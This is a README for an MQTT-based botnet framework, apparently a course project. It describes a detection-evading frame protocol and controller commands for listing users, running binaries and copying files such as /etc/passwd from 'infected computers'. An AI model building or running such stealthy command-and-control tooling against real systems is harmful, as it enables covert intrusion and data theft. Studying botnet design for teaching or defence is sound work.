
# BotNet_MQTT

## Overview

This repository implements a simple botnet framework using MQTT for communication between bots and a central controller (BotMaster). 

## Protocol

Communication between the Controller and Bots is performed using a custom binary protocol over MQTT. Each message (frame) consists of:

| Field      | Description                                      |
|------------|--------------------------------------------------|
| MAGIC      | Predefined bytes marking the start of a frame     |
| VERSION    | Protocol version byte                            |
| TYPE       | Command type byte (e.g., announce, list_users)   |
| LENGTH     | Length of the payload                            |
| AUTH       | HMAC for authentication and integrity            |
| PAYLOAD    | Command data                                     |
| CHECKSUM   | CRC32 checksum for integrity                     |

Frames are padded with random bytes and encoded using a non-standard base64 alphabet to blend with normal traffic and avoid detection.


## Protocol Logic 

The protocol is designed to be stealthy and secure:

- **Stealth:** Frames are padded with random bytes and encoded using a custom base64 alphabet to blend with normal MQTT traffic, making detection harder.
- **Authentication:** Every command is authenticated using HMAC with a shared secret. Bots only execute commands that pass all verification steps.
- **Integrity:** Each frame includes a CRC32 checksum to ensure data integrity.

## Bot Logic

The Bot acts as a passive agent, waiting for commands on a specified MQTT topic. Its logic is as follows:

1. **Listening:** The bot subscribes to the MQTT topic and waits for incoming messages.
2. **Verification:** Upon receiving a message, the bot:
    - Checks the MAGIC bytes and protocol version.
    - Verifies the command type is valid.
    - Checks the CRC32 checksum for integrity.
    - Authenticates the message using HMAC and the shared secret.
3. **Command Handling:** If all checks pass, the bot dispatches the command to the appropriate handler (e.g., list users, execute binary, etc.).
4. **Response:** The bot sends a response (status/data) back to the controller using the same protocol, ensuring authenticity and integrity.
5. **Security:** If any check fails, the message is ignored and not executed.

## BotMaster (Controller) Logic

The BotMaster (Controller) is responsible for sending commands and receiving responses:

1. **Command Construction:** The controller builds a command frame, including all protocol fields, and authenticates it with HMAC.
2. **Encoding:** The frame is padded and encoded for stealth.
3. **Publishing:** The controller publishes the command to the MQTT topic.
4. **Response Handling:** The controller listens for responses from bots, verifies their authenticity, and displays the results.
5. **Access Control:** Only controllers with the correct secret can send valid commands; all others are ignored by bots.

## Running the Program

### Prerequisites

- Python 3.10+
- Create a virtual environment
	```bash
    python3 -m venv venv
	```
- Source from the created environment
	```bash
    source venv/bin/activate
	```
- Install dependencies:
	```bash
	pip install -r requirements.txt
	```

### Usage

1. Start the MQTT broker and ensure the address/port matches those in `globvars.py` (preferred, defaults are provided by the BSY class).
2. Run a Bot instance:
	 ```bash
	 python bot/bot.py
	 ```
3. Run the Controller to send commands:
	 ```bash
	 python bot/controller.py [options]
	 ```
	 Use CLI arguments to specify commands (see source for details).

#### Controller CLI Options

The controller supports the following command-line options:

| Option           | Description                                                        | Example Usage                          |
|------------------|--------------------------------------------------------------------|----------------------------------------|
| --announce       | Announce the bot's presence to the controller                      | python bot/controller.py --announce    |
| --list-users     | List users currently logged in on the bot                          | python bot/controller.py --list-users  |
| --list-dir DIR   | List contents of the specified directory on the bot                | python bot/controller.py --list-dir /tmp |
| --user-id        | Get the user ID of the bot process                                | python bot/controller.py --user-id     |
| --kill           | Kill (terminate) the bot process                                  | python bot/controller.py --kill        |
| --copy-file PATH | Copy the specified file from the bot to the controller             | python bot/controller.py --copy-file /etc/passwd |
| --exec-binary BIN| Execute the specified binary on the bot                            | python bot/controller.py --exec-binary /usr/bin/ps |

You can only use one command option at a time. See the source code for more advanced usage.

#### Examples
- Ping the bot
    ```bash
    python bot/controller.py --announce 
    ```
- List users currently present on the infected computer
    ```bash
    python bot/controller.py --list-users
    ```
- List directories in the specified path (Path should be absolute) 
    ```bash
    python bot/controller.py --list-dir /tmp/
    ```
- Get the user ID of the Bot (the output of the `id` command) 
    ```bash
    python bot/controller.py --user-id
    ```
- Copy a file from the infected computer to Botmaster's specified by path (path should be absolute and bot should have permissions to that path). Note: In this, not very wise implementation is the file sent directly in one packet without splitting it into chunks. The output on Botmaster's machine is via console, which is also not very fortunate. 
    ```bash
    python bot/controller.py --copy-file /etc/passwd
    ```
- Execute a binary specified by path (Path should be absolute and the bot should have permissions to run the binary; binary should be executable) 
    ```bash
    python bot/controller.py --exec-binary /usr/bin/ps
    ```
- Kill the bot 
    ```bash
    python bot/controller.py --kill
    ```

## Security Features

- HMAC authentication for all messages
- Random padding and custom encoding for stealth

## File Structure

- `bot/` - Main source code
	- `bot.py` - Bot implementation
	- `controller.py` - Controller implementation
	- `protocol.py` - Protocol logic
	- `globvars.py` - Global constants and configuration

## Notes

- This project is not to be distributed with malicious intent.
